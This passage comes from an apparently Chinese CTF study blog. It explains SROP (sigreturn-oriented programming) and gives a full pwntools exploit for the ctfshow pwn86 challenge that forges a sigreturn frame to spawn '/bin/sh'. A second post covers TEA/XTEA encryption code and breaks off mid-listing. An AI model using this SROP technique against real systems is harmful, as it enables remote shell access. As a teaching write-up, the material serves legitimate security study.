<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>signal Frame是可读可写的，所以我们可以改动signal Frame来构造恶意的ROP，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。</p>
<p><img src="/2025/09/01/SROP/3.png" alt="1"></p>
<h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可。</p>
<ul>
<li><strong>控制栈指针。</strong></li>
<li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li>
</ul>
<p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p>
<p><img src="/2025/09/01/SROP/4.png" alt="1"></p>
<h3 id="需要满足的条件"><a href="#需要满足的条件" class="headerlink" title="需要满足的条件"></a>需要满足的条件</h3><ul>
<li><strong>可以通过栈溢出来控制栈的内容</strong></li>
<li>需要知道相应的地址<ul>
<li><strong>“&#x2F;bin&#x2F;sh”</strong></li>
<li><strong>Signal Frame</strong></li>
<li><strong>syscall</strong></li>
<li><strong>sigreturn</strong></li>
</ul>
</li>
</ul>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="ctfshow-pwn86"><a href="#ctfshow-pwn86" class="headerlink" title="ctfshow pwn86"></a>ctfshow pwn86</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v3; // rax</span><br><span class="line">  signed __int64 v4; // rax</span><br><span class="line"></span><br><span class="line">  v3 = sys_write(1u, global_pwn, 0x17uLL);</span><br><span class="line">  if ( (unsigned __int64)sys_read(0, global_buf, 0x200uLL) &gt;= 0xF8 )</span><br><span class="line">    __asm &#123; syscall; LINUX - sys_rt_sigreturn &#125;</span><br><span class="line">  v4 = sys_exit(0);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sys_read(0, global_buf, 0x200uLL)就是读入的栈帧(signal frame)</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置上下文信息</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 加载目标二进制文件</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 连接到目标</span></span><br><span class="line">    <span class="comment"># p = process(&#x27;./pwn&#x27;)  # 本地测试</span></span><br><span class="line">    p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28236&quot;</span>)  <span class="comment"># 远程连接</span></span><br><span class="line">    <span class="comment">#elf.sym[&#x27;global_buf&#x27;] = 0x601040</span></span><br><span class="line">    <span class="comment">#elf.sym[&#x27;syscall&#x27;] = 0x400147</span></span><br><span class="line">    <span class="comment"># 定义常量</span></span><br><span class="line">    BIN_SH_OFFSET = <span class="number">0x100</span>  <span class="comment"># &quot;/bin/sh&quot;字符串在缓冲区中的偏移</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造信号返回帧</span></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = constants.SYS_execve  <span class="comment"># 系统调用号</span></span><br><span class="line">    frame.rdi = elf.sym[<span class="string">&#x27;global_buf&#x27;</span>] + BIN_SH_OFFSET  <span class="comment"># 参数字符串地址</span></span><br><span class="line">    frame.rsi = <span class="number">0</span>  <span class="comment"># argv参数</span></span><br><span class="line">    frame.rdx = <span class="number">0</span>  <span class="comment"># envp参数</span></span><br><span class="line">    frame.rip = elf.sym[<span class="string">&#x27;syscall&#x27;</span>]  <span class="comment"># 返回后执行的指令地址</span></span><br><span class="line">    </span><br><span class="line">    log.info(<span class="string">&quot;构造的信号返回帧:&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;RAX = <span class="subst">&#123;frame.rax&#125;</span> (SYS_execve)&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;RDI = <span class="subst">&#123;<span class="built_in">hex</span>(frame.rdi)&#125;</span> (global_buf + <span class="subst">&#123;BIN_SH_OFFSET&#125;</span>)&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;RIP = <span class="subst">&#123;<span class="built_in">hex</span>(frame.rip)&#125;</span> (syscall)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造攻击载荷</span></span><br><span class="line">    payload = <span class="built_in">bytes</span>(frame)</span><br><span class="line">    padding = <span class="string">b&#x27;A&#x27;</span> * (BIN_SH_OFFSET - <span class="built_in">len</span>(payload))</span><br><span class="line">    bin_sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    </span><br><span class="line">    full_payload = payload + padding + bin_sh</span><br><span class="line">    </span><br><span class="line">    log.info(<span class="string">f&quot;载荷长度: <span class="subst">&#123;<span class="built_in">len</span>(full_payload)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;帧数据: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;填充数据: <span class="subst">&#123;<span class="built_in">len</span>(padding)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;字符串数据: <span class="subst">&#123;<span class="built_in">len</span>(bin_sh)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送载荷</span></span><br><span class="line">    p.send(full_payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 切换到交互模式</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/08/31/tea%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/08/31/tea%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">tea加解密学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-08-31 10:07:03" itemprop="dateCreated datePublished" datetime="2025-08-31T10:07:03+08:00">2025-08-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:07:47" itemprop="dateModified" datetime="2025-09-23T21:07:47+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/tea/" itemprop="url" rel="index"><span itemprop="name">tea</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>开始tea加密的学习</p>
<h2 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h2><h3 id="加密："><a href="#加密：" class="headerlink" title="加密："></a>加密：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, i;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 明文分组（小端序十六进制）</span></span><br><span class="line">    <span class="type">uint32_t</span> plaintext[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x67616C66</span>, <span class="number">0x3332317B</span>, <span class="number">0x37363534</span>, <span class="number">0x30303938</span>,</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x7D353433</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 密钥（小端序十六进制）</span></span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印原始明文</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;原始明文（小端序十六进制）:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, plaintext[i]);</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对每个64位分组进行加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123; plaintext[i], plaintext[i + <span class="number">1</span>] &#125;;</span><br><span class="line">        encrypt(v, key);</span><br><span class="line">        plaintext[i] = v[<span class="number">0</span>];</span><br><span class="line">        plaintext[i + <span class="number">1</span>] = v[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印加密后的密文</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n加密后的密文（小端序十六进制）:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X &quot;</span>, plaintext[i]);</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python和c与语言在tea加密的时候会发现有时候会不一样，其中有可能是小端序储存的问题。</p>
<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0xC6EF3720</span>, i;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">0x34333231</span>, <span class="number">0x38373635</span>, <span class="number">0x32313039</span>, <span class="number">0x36353433</span>&#125;; <span class="comment">// 密钥</span></span><br><span class="line">    <span class="type">uint32_t</span> blocks[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">0x4438A9E2</span>, <span class="number">0x39D00322</span>&#125;, <span class="comment">// 密文块1</span></span><br><span class="line">        &#123;<span class="number">0x55564858</span>, <span class="number">0x0414AC05</span>&#125;, <span class="comment">// 密文块2</span></span><br><span class="line">        &#123;<span class="number">0x4D66EF71</span>, <span class="number">0x5ABD1754</span>&#125;, <span class="comment">// 密文块3</span></span><br><span class="line">        &#123;<span class="number">0x94554B4A</span>, <span class="number">0x8F3245C0</span>&#125;  <span class="comment">// 密文块4</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123;blocks[i][<span class="number">0</span>], blocks[i][<span class="number">1</span>]&#125;;</span><br><span class="line">        decrypt(v, k);</span><br><span class="line">        <span class="comment">// 将解密后的uint32_t转换为小端序字节序列并输出</span></span><br><span class="line">        <span class="type">uint8_t</span> *bytes = (<span class="type">uint8_t</span> *)v;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, bytes[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>TEA（Tiny Encryption Algorithm）是一种分组密码算法，由David Wheeler和Roger Needham于1994年提出。它采用64位数据块和128位</p>
<p>密钥，具有简单、高效的特点。算法使用32轮循环的Feistel结构，每轮操作包括移位、异或和加法</p>
<h3 id="最常魔改点"><a href="#最常魔改点" class="headerlink" title="最常魔改点"></a>最常魔改点</h3><p>delta &#x3D; 0x9e3779b9(标准)   这里经常会被换成别的数据</p>
<p>在反汇编中x-&#x3D;0x61c88647和x+&#x3D;0x9e3779b9，这两个值是等价的。</p>
<p>进行32轮循环，每轮执行以下操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sum += delta;</span><br><span class="line">v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br></pre></td></tr></table></figure>

<p>解密的换就反过来进行32次就可以了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">sum -= delta;</span><br></pre></td></tr></table></figure>



<h2 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* XTEA加密函数 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> 